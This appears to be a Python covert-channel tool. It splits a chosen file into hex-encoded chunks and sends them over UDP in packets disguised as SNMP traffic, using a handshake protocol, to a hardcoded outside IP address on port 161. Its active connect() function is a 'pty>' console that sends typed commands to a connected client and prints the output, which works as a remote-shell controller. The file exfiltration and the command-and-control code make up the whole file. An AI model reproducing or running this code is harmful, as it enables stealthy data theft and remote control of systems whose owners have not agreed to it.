import sys
import os
import socket
import base64
import math
import subprocess
import threading
import eventlet

from gen_packet import GenPacket

eventlet.monkey_patch()

# These constant variables should not be modified

# Transmission state
INFORM = "00"
REPLY = "01"
DATA = "02"
SUCCESS = "03"
FAIL = "04"

# File type
NON_FILE = "00"
COMMAND = "01"
TEXT = "02"
IMAGE = "03"
VIDEO = "04"

PLACEHOLDER = "00"


#ADDR = ("127.0.0.1", 1610)
ADDR = ("144.202.113.43", 161)



def ToHex(num, length):
    num = hex(num)[2 : ]
    while len(num) < length:
        num = "0" + num
    return num.upper()

def GetPacketNum(path):
    file_name = path.split("/")[-1]
    data_field_size = 127 - 27 - (7 + len(file_name))    
    file_size = os.path.getsize(path)
    return int(math.ceil(float(file_size) / float(data_field_size)))
    

def encode(string):
    msg = ""
    for ch in string:
        msg += ToHex(ord(ch), 2)
    return base64.b16decode(msg, True)







def SendSnmpPacket(address, _type, arg):

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Step 1
    informpacket =  ""
    informpacket += INFORM
    informpacket += NON_FILE
    informpacket += PLACEHOLDER + PLACEHOLDER    # Packet index
    informpacket += "0001" if _type == "command" else ToHex(GetPacketNum(arg), 4)
    informpacket += PLACEHOLDER

    # File name length
    if _type == "command":
        informpacket += "0100"
    else: # _type == "file"
        informpacket += ToHex(len(arg.split("/")[-1]), 2)
        for ch in arg.split("/")[-1]:
            informpacket += hex(ord(ch))[2 : ]

    s.sendto(GenPacket(informpacket), address)


    # Processing Step 2
    while True:
        replypacket = base64.b16encode(s.recv(256))
        replypacket = str(replypacket, encoding = "utf-8")

        trans_state = replypacket[58 : 60]
        trans_file_type = replypacket[60 : 62]     # get filetype field
        total_packet_num = replypacket[66 : 70]    # get packet number field

        if trans_state == REPLY \
        and trans_file_type == NON_FILE \
        and total_packet_num == ToHex(("0001" if _type == "command" else GetPacketNum(arg)), 4):
            # get the reply successfully
            break
            
    # Step 3
    if _type == "file":
        
        packet_num = GetPacketNum(arg)


        cur_file = open(arg, 'r')

        i = 0
        #for i in range(packet_num):
        while i < packet_num:
            file_package =  ""
            file_package += DATA
            file_package += TEXT
            file_package += ToHex(i, 4)

            normal_packet_size = ToHex(127 - 27 - (7 + len(arg.split("/")[-1])), 4) 
    
            if i + 1 != packet_num:
                cur_data_size = normal_packet_size
            else: # last packet
                cur_data_size = ToHex(os.path.getsize(arg) - int(normal_packet_size, 16) * i, 4)

            file_package += cur_data_size

            file_package += ToHex(len(arg.split("/")[-1]), 2)
            for ch in arg.split("/")[-1]:
                file_package += hex(ord(ch))[2 : ]

            
            
            
            cur_file_data = cur_file.read(int(cur_data_size, 16))
            for ch in cur_file_data:
                file_package += ToHex(ord(ch), 2)

            #if i % 10 != 0 or i == 0:
            s.sendto(GenPacket(file_package), address)
        

            # Process Step 4
            checkpacket = b""
            file_name_ascii = ""
            for ch in arg.split("/")[-1]:
                file_name_ascii += hex(ord(ch))[2 : ]


            while True:
                checkpacket = base64.b16encode(s.recv(256))
                checkpacket = str(checkpacket, encoding = "utf-8")
                if checkpacket[58 : 60] == SUCCESS \
                and checkpacket[74 : ].upper() == file_name_ascii.upper():
                    break
                if checkpacket[58 : 60] == FAIL \
                and checkpacket[74 : ].upper() == file_name_ascii.upper():
                    if int(checkpacket[62 : 66], 16) == i + 1:
                        break
                    s.sendto(GenPacket(file_package),  address)

            i += 1

        cur_file.close()
    return


def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.bind(("127.0.0.1", 38297)) 
    s.listen(5) 
    print ("Listening for TCP connection on localhost.38297")

    conn, addr = s.accept() 
    print ("Connected with: ", addr)

    while True:
        command = input("pty> ")
        if len(command) == 0:
            continue
        if "exit" in command: 
            conn.send(encode("exit"))
            conn.close()
            break
        else:
            conn.send(encode(command)) 
            with eventlet.Timeout(3, False):
                print(str(conn.recv(1024), encoding = "utf-8")) 


def main():
    
    # Example 
    SendSnmpPacket(ADDR, "file", "/home/zhuo1ang/long")
    
    while True:
        ip = input("Please enter the target IP address... ")
        port = input("And the port... ")
        path = input("The file path... ") 
        
        tr = threading.Thread(target = SendSnmpPacket((ip, int(port)), "file", path))
        tr.start()
        tr.join()





#main()

connect()

